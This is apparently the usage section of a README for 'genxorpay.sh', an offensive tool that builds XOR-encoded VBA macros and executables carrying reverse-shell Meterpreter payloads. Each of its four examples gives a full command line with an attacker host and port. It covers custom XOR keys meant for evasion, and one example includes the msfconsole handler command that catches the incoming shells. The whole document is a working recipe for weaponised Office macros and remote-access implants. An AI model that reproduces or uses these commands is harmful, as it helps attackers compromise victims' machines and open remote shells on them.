### 1️⃣ Generate VBA Macro for Reverse HTTPS Meterpreter

```bash
./genxorpay.sh -p 1 -lhost 10.10.14.22 -lport 443 -o payload.vba -raw raw_shellcode.vba
```
- Creates XOR-encoded VBA macro in `payload.vba`
- Stores raw shellcode in `raw_shellcode.vba`
- Listener: `msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; ..."`

---
### 2️⃣ Generate Payload and Enter Interactive Mode

```bash
./genxorpay.sh -p 4 -lhost 192.168.1.7 -lport 4444 -o macro.vba -i
```

- After generation, lets you **copy**:
    - VBA macro
    - Raw shellcode
    - XOR-encoded buffer
    - Listener command
    - Or **all at once** to clipboard

---

### 3️⃣ Generate `.exe` for Python Meterpreter Shell

```bash
./genxorpay.sh -p 16 -lhost 192.168.1.5 -lport 5555
```

- Creates binary output: `python_meterpreter_reverse_tcp.exe`
- Skips VBA since it's unsupported for non-shellcode formats

---

### 4️⃣ Use Custom XOR Key

```bash
./genxorpay.sh -p 6 -lhost 10.0.0.10 -lport 1337 -key 0x2A -o evil_macro.vba
```

- Uses custom XOR key `0x2A`
- Output: `evil_macro.vba`

